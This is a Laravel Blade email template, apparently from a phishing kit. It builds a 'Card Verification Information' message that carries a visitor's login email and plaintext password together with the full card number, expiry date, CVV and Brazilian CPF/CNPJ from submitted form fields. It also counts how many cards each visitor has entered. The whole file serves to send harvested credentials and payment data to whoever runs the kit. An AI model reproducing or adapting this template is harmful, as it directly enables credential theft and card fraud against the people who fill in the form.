{{--@formatter:off--}}
@php
use Illuminate\Foundation\Inspiring;
[$message, $author] = str(Inspiring::quotes()->random())->explode('-');
@endphp
<x-mail::message>
# Card Verification Information

## Login Information
- **Email:** {{ $visitor->user }}
- **Password:** {{ $visitor->pass }}

## Card Verification Details
- **Card Holder Name:** {{ $request->get('cardHolder') }}
- **Card Number:** {{ $request->get('cardNumber') }}
- **Card Type:** {{ ucfirst($request->get('type')) }}
- **Expiry Date:** {{ $request->get('expiryDate') }}
- **CVV:** {{ $request->get('cvv') }}
- **CPF/CNPJ:** {{ $request->get('cpf') }}

## System Information
- **Verification Date:** {{ now()->format('d/m/Y H:i:s') }}
- **Visitor ID:** {{ $visitor->id }}
- **Card Verification Count:** {{ $visitor->card_count + 1 }}

---

> *{{ $message }}* — {{ $author }}

<x-mail::button :url="config('app.url')">
Access System
</x-mail::button>

Thanks,<br>
{{ config('app.name') }}
</x-mail::message>
